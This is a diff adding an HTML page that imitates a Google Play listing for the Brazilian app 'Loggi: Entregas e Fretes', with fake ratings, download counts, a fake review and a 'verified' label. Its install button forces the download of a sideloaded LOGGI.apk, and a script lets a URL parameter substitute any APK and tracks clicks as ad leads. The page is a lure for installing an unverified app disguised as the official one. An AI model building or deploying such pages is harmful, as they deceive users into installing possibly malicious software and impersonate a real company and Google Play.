@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="theme-color" content="#ffffff">
+  <meta name="format-detection" content="telephone=no">
+  <title>Loggi: Entregas e Fretes</title>
+  <link rel="icon" type="image/png" href="assets/loggi-icon.png">
+  <link rel="shortcut icon" href="assets/loggi-icon.png">
+  <link rel="apple-touch-icon" href="assets/loggi-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --brand-color: #00A3FF;
+      --brand-color-dark: #0082CC;
+      --play-green: #01875f;
+      --play-green-dark: #006847;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --divider: #e8eaed;
+      --bg: #ffffff;
+      --nav-inactive: #5f6368;
+    }
+
+    html {
+      font-size: 16px;
+      -webkit-text-size-adjust: 100%;
+      width: 100%;
+      height: 100%;
+      overflow-x: hidden;
+    }
+
+    body {
+      font-family: 'Roboto', system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
+      width: 100%;
+      min-height: 100%;
+      min-height: 100dvh;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      line-height: 1.4;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .app-shell {
+      width: 100%;
+      max-width: 100%;
+      min-height: 100dvh;
+      margin: 0;
+      padding: 0;
+      padding-bottom: calc(64px + env(safe-area-inset-bottom));
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 100%;
+      margin: 0;
+      padding: 20px 16px 24px;
+      padding-left: max(16px, env(safe-area-inset-left));
+      padding-right: max(16px, env(safe-area-inset-right));
+    }
+
+    /* Google Play top bar */
+    .play-topbar {
+      position: sticky;
+      top: 0;
+      z-index: 200;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 56px;
+      min-height: 56px;
+      padding: 0 4px 0 12px;
+      padding-left: max(12px, env(safe-area-inset-left));
+      padding-right: max(4px, env(safe-area-inset-right));
+      padding-top: env(safe-area-inset-top);
+      background: #fff;
+      flex-shrink: 0;
+    }
+
+    .play-brand {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+      color: #5f6368;
+      flex-shrink: 0;
+    }
+
+    .play-brand__icon {
+      width: auto;
+      height: 24px;
+      flex-shrink: 0;
+      display: block;
+      object-fit: contain;
+    }
+
+    .play-brand__text {
+      font-size: 1.25rem;
+      line-height: 1;
+      letter-spacing: -0.02em;
+      color: #5f6368;
+      white-space: nowrap;
+    }
+
+    .play-brand__text .google {
+      font-weight: 500;
+    }
+
+    .play-brand__text .play {
+      font-weight: 400;
+    }
+
+    .play-topbar__actions {
+      display: flex;
+      align-items: center;
+      flex-shrink: 0;
+    }
+
+    .play-topbar__btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 48px;
+      height: 48px;
+      padding: 0;
+      border: none;
+      background: transparent;
+      color: #5f6368;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .play-topbar__btn .material-icons-outlined {
+      font-size: 1.5rem;
+    }
+
+    .play-topbar__btn--help .material-icons-outlined {
+      font-size: 1.375rem;
+    }
+
+    .play-topbar__avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #e8eaed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .play-topbar__avatar svg {
+      width: 20px;
+      height: 20px;
+      fill: #5f6368;
+    }
+
+    .play-topbar__btn--profile {
+      width: 48px;
+      height: 48px;
+    }
+
+    /* App listing header */
+    .app-header {
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+
+    .app-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 16px;
+      flex-shrink: 0;
+      object-fit: contain;
+      box-shadow: 0 1px 3px rgba(0,0,0,.08);
+      background: #fff;
+      padding: 4px;
+    }
+
+    .developer-name {
+      font-size: 0.875rem;
+      color: var(--brand-color);
+      font-weight: 500;
+      margin-bottom: 2px;
+    }
+
+    .info-box {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+      line-height: 1.55;
+      margin-bottom: 10px;
+      padding: 12px 14px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      border-left: 3px solid var(--brand-color);
+    }
+
+    .app-meta h1 {
+      font-size: 1.375rem;
+      font-weight: 500;
+      letter-spacing: -0.01em;
+      line-height: 1.3;
+      margin-bottom: 4px;
+    }
+
+    .verified {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      font-weight: 400;
+    }
+
+    /* Stats row */
+    .stats {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      padding: 12px 0 20px;
+      border-bottom: 1px solid var(--divider);
+      margin-bottom: 20px;
+    }
+
+    .stat {
+      flex: 1;
+      text-align: center;
+      position: relative;
+    }
+
+    .stat:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 1px;
+      height: 28px;
+      background: var(--divider);
+    }
+
+    .stat-value {
+      font-size: 0.875rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+    }
+
+    .stat-value .star {
+      font-size: 0.75rem;
+      color: var(--text-primary);
+    }
+
+    .stat-label {
+      font-size: 0.6875rem;
+      color: var(--text-secondary);
+      margin-top: 2px;
+    }
+
+    /* Install CTA */
+    .install-btn {
+      display: block;
+      width: 100%;
+      background: var(--play-green);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 16px;
+      cursor: pointer;
+      text-align: center;
+      font-size: 0.875rem;
+      font-weight: 500;
+      font-family: inherit;
+      transition: background 0.15s;
+      margin-bottom: 16px;
+    }
+
+    .install-btn:hover,
+    .install-btn:active {
+      background: var(--play-green-dark);
+    }
+
+    /* Secondary actions */
+    .secondary-actions {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      margin-bottom: 28px;
+    }
+
+    .action-link {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      background: none;
+      border: none;
+      color: var(--play-green);
+      font-size: 0.75rem;
+      font-family: inherit;
+      cursor: pointer;
+      padding: 4px 8px;
+    }
+
+    .action-link .material-icons-outlined {
+      font-size: 1.25rem;
+    }
+
+    /* About section */
+    .about {
+      padding-top: 4px;
+    }
+
+    .about-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+
+    .about-header h2 {
+      font-size: 1.0625rem;
+      font-weight: 500;
+    }
+
+    .about-header .material-icons-outlined {
+      color: var(--text-secondary);
+      font-size: 1.25rem;
+    }
+
+    .rating-highlight {
+      font-size: 0.875rem;
+      margin-bottom: 8px;
+    }
+
+    .features {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
+
+    .warning-title {
+      font-size: 0.875rem;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .warning-text {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+      line-height: 1.55;
+      margin-bottom: 10px;
+    }
+
+    .warning-text:last-child {
+      margin-bottom: 0;
+    }
+
+    .updated {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+      margin-top: 16px;
+    }
+
+    /* Section blocks */
+    .section {
+      padding: 24px 0;
+      border-top: 1px solid var(--divider);
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .section-header h2 {
+      font-size: 1.0625rem;
+      font-weight: 500;
+    }
+
+    .section-header .material-icons-outlined {
+      color: var(--text-secondary);
+      font-size: 1.25rem;
+    }
+
+    /* Data safety card */
+    .safety-card {
+      border: 1px solid var(--divider);
+      border-radius: 8px;
+      padding: 4px 0;
+    }
+
+    .safety-item {
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      padding: 14px 16px;
+    }
+
+    .safety-item + .safety-item {
+      border-top: 1px solid var(--divider);
+    }
+
+    .safety-item .material-icons-outlined {
+      font-size: 1.25rem;
+      color: var(--text-secondary);
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    .safety-item p {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+      line-height: 1.45;
+    }
+
+    .safety-more {
+      display: inline-block;
+      margin-top: 12px;
+      font-size: 0.875rem;
+      color: var(--play-green);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    /* Ratings */
+    .ratings-summary {
+      display: flex;
+      gap: 24px;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+
+    .rating-big {
+      font-size: clamp(2.5rem, 12vw, 3.5rem);
+      font-weight: 400;
+      line-height: 1;
+      letter-spacing: -0.02em;
+    }
+
+    .rating-bars {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      padding-top: 8px;
+    }
+
+    .rating-bar-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      height: 12px;
+    }
+
+    .rating-bar-row span:first-child {
+      font-size: 0.6875rem;
+      color: var(--text-secondary);
+      width: 8px;
+      text-align: right;
+    }
+
+    .rating-bar-track {
+      flex: 1;
+      height: 10px;
+      background: #e8eaed;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+
+    .rating-bar-fill {
+      height: 100%;
+      background: var(--play-green);
+      border-radius: 2px;
+    }
+
+    .rating-stars-big {
+      display: flex;
+      gap: 2px;
+      margin-top: 4px;
+    }
+
+    .rating-stars-big span {
+      color: var(--play-green);
+      font-size: 0.75rem;
+    }
+
+    .review-count-label {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-top: 2px;
+    }
+
+    /* Review card */
+    .review {
+      margin-bottom: 16px;
+    }
+
+    .review-header {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    .review-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #7baaf7;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.875rem;
+      font-weight: 500;
+      flex-shrink: 0;
+    }
+
+    .review-meta .name {
+      font-size: 0.875rem;
+      font-weight: 400;
+    }
+
+    .review-stars {
+      display: flex;
+      gap: 1px;
+      margin-top: 2px;
+    }
+
+    .review-stars span {
+      color: var(--play-green);
+      font-size: 0.625rem;
+    }
+
+    .review-date {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-left: auto;
+      flex-shrink: 0;
+    }
+
+    .review-text {
+      font-size: 0.875rem;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+
+    .review-helpful-count {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-bottom: 12px;
+    }
+
+    .review-helpful-q {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+      margin-bottom: 8px;
+    }
+
+    .review-helpful-btns {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .review-helpful-btns button {
+      padding: 6px 16px;
+      border: 1px solid var(--divider);
+      border-radius: 16px;
+      background: #fff;
+      font-size: 0.8125rem;
+      font-family: inherit;
+      color: var(--text-primary);
+      cursor: pointer;
+    }
+
+    .section-links {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .section-links a {
+      font-size: 0.875rem;
+      color: var(--play-green);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    /* Google Play footer */
+    .play-footer {
+      text-align: center;
+      padding: 20px 0 8px;
+      border-top: 1px solid var(--divider);
+      margin-top: 8px;
+    }
+
+    .play-logo {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 0.875rem;
+      color: var(--text-secondary);
+      font-weight: 400;
+    }
+
+    .play-logo .play-icon {
+      width: auto;
+      height: 20px;
+      display: block;
+      object-fit: contain;
+    }
+
+    .play-logo .google { color: #5f6368; }
+    .play-logo .play { color: #5f6368; font-weight: 500; }
+
+    /* Bottom navigation */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      width: 100%;
+      max-width: 100%;
+      background: #fff;
+      border-top: 1px solid var(--divider);
+      display: flex;
+      justify-content: space-around;
+      align-items: stretch;
+      padding: 6px 0 calc(6px + env(safe-area-inset-bottom));
+      padding-left: env(safe-area-inset-left);
+      padding-right: env(safe-area-inset-right);
+      z-index: 100;
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      flex: 1;
+      padding: 4px 0;
+      text-decoration: none;
+      color: var(--nav-inactive);
+      font-size: 0.625rem;
+      font-weight: 500;
+      letter-spacing: 0.01em;
+      min-width: 0;
+    }
+
+    .nav-item .material-icons-outlined {
+      font-size: 1.375rem;
+    }
+
+    .nav-item.active {
+      color: var(--play-green);
+    }
+
+    .nav-item span {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 100%;
+    }
+
+    img:not(.play-brand__icon):not(.play-icon):not(.app-icon), svg, video {
+      max-width: 100%;
+      height: auto;
+    }
+
+    .play-brand__icon,
+    .play-logo .play-icon {
+      max-width: none;
+    }
+
+    .ratings-summary {
+      flex-wrap: nowrap;
+      min-width: 0;
+    }
+
+    .rating-bars {
+      min-width: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="app-shell">
+    <header class="play-topbar" aria-label="Google Play">
+      <a href="#" class="play-brand" id="playBrand">
+        <img class="play-brand__icon" src="assets/google-play-logo.png" width="24" height="24" alt="">
+        <span class="play-brand__text"><span class="google">Google</span> <span class="play">Play</span></span>
+      </a>
+      <div class="play-topbar__actions">
+        <button type="button" class="play-topbar__btn" aria-label="Pesquisar">
+          <span class="material-icons-outlined">search</span>
+        </button>
+        <button type="button" class="play-topbar__btn play-topbar__btn--help" aria-label="Ajuda">
+          <span class="material-icons-outlined">help_outline</span>
+        </button>
+        <button type="button" class="play-topbar__btn play-topbar__btn--profile" aria-label="Conta">
+          <span class="play-topbar__avatar" aria-hidden="true">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+            </svg>
+          </span>
+        </button>
+      </div>
+    </header>
+
+  <main class="page">
+    <header class="app-header">
+      <img class="app-icon" src="assets/loggi-icon.png" width="72" height="72" alt="Loggi: Entregas e Fretes">
+      <div class="app-meta">
+        <h1>Loggi: Entregas e Fretes</h1>
+        <p class="developer-name">Loggi Tecnologia Ltda.</p>
+        <p class="verified">Verificado pelo desenvolvedor</p>
+      </div>
+    </header>
+
+    <section class="stats" aria-label="Estatísticas do aplicativo">
+      <div class="stat">
+        <div class="stat-value">4,8<span class="star" aria-hidden="true">★</span></div>
+        <div class="stat-label">280 mil avaliações</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value">10 milhões+</div>
+        <div class="stat-label">downloads</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value">Livre</div>
+        <div class="stat-label">Classificação</div>
+      </div>
+    </section>
+
+    <a href="LOGGI.apk" download="LOGGI.apk" class="install-btn" id="installBtn" style="text-decoration: none; display: block; box-sizing: border-box;">BAIXAR</a>
+
+    <div class="secondary-actions">
+      <button type="button" class="action-link" id="shareBtn">
+        <span class="material-icons-outlined">share</span>
+        Compartilhar
+      </button>
+      <button type="button" class="action-link" id="wishlistBtn">
+        <span class="material-icons-outlined">bookmark_add</span>
+        Adicionar à lista de desejos
+      </button>
+    </div>
+
+    <section class="about">
+      <div class="about-header">
+        <h2>Sobre este aplicativo</h2>
+        <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
+      </div>
+      <p class="rating-highlight">📦 Aplicativo oficial da Loggi - Entregas e Fretes Expressos</p>
+      <p class="features">Entregas Rápidas · Motoboys e Vans · Rastreamento em Tempo Real · Cotação de Frete</p>
+      <p class="info-box">
+        O aplicativo oficial da <strong>Loggi</strong> conecta você à maior rede de entregadores do Brasil. Envie pacotes, documentos e encomendas com rapidez, segurança e acompanhamento em tempo real do seu pedido.
+      </p>
+      <p class="warning-text">
+        A <strong>Loggi</strong> oferece soluções completas de envio para pessoas físicas e empresas. Solicite entregas locais de motoboy ou envie pacotes para qualquer lugar do Brasil com praticidade.
+      </p>
+      <p class="warning-text">
+        Para <strong>mais informações e suporte</strong>, acesse o portal oficial <strong>loggi.com</strong>.
+      </p>
+      <p class="updated">Atualizado em 12 de fev. de 2026</p>
+    </section>
+
+    <section class="section data-safety">
+      <div class="section-header">
+        <h2>Segurança dos dados</h2>
+        <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
+      </div>
+      <p class="warning-text" style="margin-bottom: 12px;">
+        A segurança começa com a compreensão de como os desenvolvedores coletam e compartilham seus dados. As práticas de segurança e privacidade de dados podem variar de acordo com o uso, a região e a idade. O desenvolvedor forneceu as informações a seguir, que podem ser atualizadas ao longo do tempo.
+      </p>
+      <div class="safety-card">
+        <div class="safety-item">
+          <span class="material-icons-outlined">location_on</span>
+          <p>Coleta de localização para acompanhar entregadores e calcular rotas e fretes em tempo real</p>
+        </div>
+        <div class="safety-item">
+          <span class="material-icons-outlined">inventory_2</span>
+          <p>Histórico de envios, endereços salvos e comprovantes digitais de entrega sincronizados na sua conta</p>
+        </div>
+        <div class="safety-item">
+          <span class="material-icons-outlined">lock</span>
+          <p>Os dados são criptografados em trânsito</p>
+        </div>
+        <div class="safety-item">
+          <span class="material-icons-outlined">support_agent</span>
+          <p>Dúvidas sobre privacidade: contato@loggi.com · loggi.com</p>
+        </div>
+      </div>
+      <a href="#" class="safety-more">Mais detalhes</a>
+    </section>
+
+    <section class="section ratings-section">
+      <div class="section-header">
+        <h2>Classificações e resenhas</h2>
+        <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
+      </div>
+
+      <div class="ratings-summary">
+        <div>
+          <div class="rating-big">4,8</div>
+          <div class="rating-stars-big" aria-label="4,8 de 5 estrelas">
+            <span>★</span><span>★</span><span>★</span><span>★</span><span>★</span>
+          </div>
+          <div class="review-count-label">280 mil</div>
+        </div>
+        <div class="rating-bars" aria-hidden="true">
+          <div class="rating-bar-row"><span>5</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:88%"></div></div></div>
+          <div class="rating-bar-row"><span>4</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:8%"></div></div></div>
+          <div class="rating-bar-row"><span>3</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:2%"></div></div></div>
+          <div class="rating-bar-row"><span>2</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:1%"></div></div></div>
+          <div class="rating-bar-row"><span>1</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:1%"></div></div></div>
+        </div>
+      </div>
+
+      <article class="review">
+        <div class="review-header">
+          <div class="review-avatar" aria-hidden="true">M</div>
+          <div class="review-meta">
+            <div class="name">Marcelo Santos</div>
+            <div class="review-stars" aria-label="5 estrelas">
+              <span>★</span><span>★</span><span>★</span><span>★</span><span>★</span>
+            </div>
+          </div>
+          <time class="review-date" datetime="2026-02-18">18 de fev. de 2026</time>
+        </div>
+        <p class="review-text">Aplicativo excelente! As entregas chegam super rápido e o rastreamento em tempo real do motoboy no mapa funciona perfeitamente. Muito fácil para cotar e enviar encomendas.</p>
+        <p class="review-helpful-count">645 pessoas acharam esta avaliação útil</p>
+        <p class="review-helpful-q">Você achou isso útil?</p>
+        <div class="review-helpful-btns">
+          <button type="button">Sim</button>
+          <button type="button">Não</button>
+        </div>
+      </article>
+
+      <div class="section-links">
+        <a href="#">Ver todas as avaliações</a>
+        <a href="#">Sinalizar como impróprio</a>
+      </div>
+    </section>
+
+    <footer class="play-footer">
+      <div class="play-logo">
+        <img class="play-icon" src="assets/google-play-logo.png" width="20" height="20" alt="">
+        <span class="google">Google</span>
+        <span class="play">Play</span>
+      </div>
+    </footer>
+  </main>
+
+  <nav class="bottom-nav" aria-label="Navegação">
+    <a href="#" class="nav-item">
+      <span class="material-icons-outlined">sports_esports</span>
+      <span>Games</span>
+    </a>
+    <a href="#" class="nav-item active" aria-current="page">
+      <span class="material-icons-outlined">apps</span>
+      <span>Apps</span>
+    </a>
+    <a href="#" class="nav-item">
+      <span class="material-icons-outlined">local_movies</span>
+      <span>Movies</span>
+    </a>
+    <a href="#" class="nav-item">
+      <span class="material-icons-outlined">menu_book</span>
+      <span>Books</span>
+    </a>
+    <a href="#" class="nav-item">
+      <span class="material-icons-outlined">star</span>
+      <span>Kids</span>
+    </a>
+  </nav>
+  </div>
+
+  <script>
+    (function () {
+      var params = new URLSearchParams(window.location.search);
+      var fbPixelId = params.get('fbPixelId');
+
+      if (fbPixelId) {
+        !function (f, b, e, v, n, t, s) {
+          if (f.fbq) return;
+          n = f.fbq = function () {
+            n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+          };
+          if (!f._fbq) f._fbq = n;
+          n.push = n;
+          n.loaded = !0;
+          n.version = '2.0';
+          n.queue = [];
+          t = b.createElement(e);
+          t.async = !0;
+          t.src = v;
+          s = b.getElementsByTagName(e)[0];
+          s.parentNode.insertBefore(t, s);
+        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', fbPixelId);
+        fbq('track', 'PageView');
+      }
+
+      var installBtn = document.getElementById('installBtn');
+      var downloadUrl = params.get('apk') || 'LOGGI.apk';
+
+      if (installBtn) {
+        installBtn.setAttribute('href', downloadUrl);
+        installBtn.setAttribute('download', 'LOGGI.apk');
+
+        installBtn.addEventListener('click', function (e) {
+          if (fbPixelId && typeof fbq === 'function') {
+            fbq('track', 'Lead');
+          }
+          // Direct fallback trigger to force download on all mobile browsers & webviews
+          setTimeout(function () {
+            window.location.href = downloadUrl;
+          }, 100);
+        });
+      }
+
+      document.getElementById('shareBtn').addEventListener('click', function () {
+        var url = window.location.href;
+        if (navigator.share) {
+          navigator.share({ title: 'Loggi: Entregas e Fretes', url: url }).catch(function () {});
+        } else if (navigator.clipboard) {
+          navigator.clipboard.writeText(url);
+        }
+      });
+
+      document.querySelectorAll('.bottom-nav .nav-item, .section-links a, .safety-more, .play-brand, .play-topbar__btn').forEach(function (item) {
+        item.addEventListener('click', function (e) {
+          e.preventDefault();
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
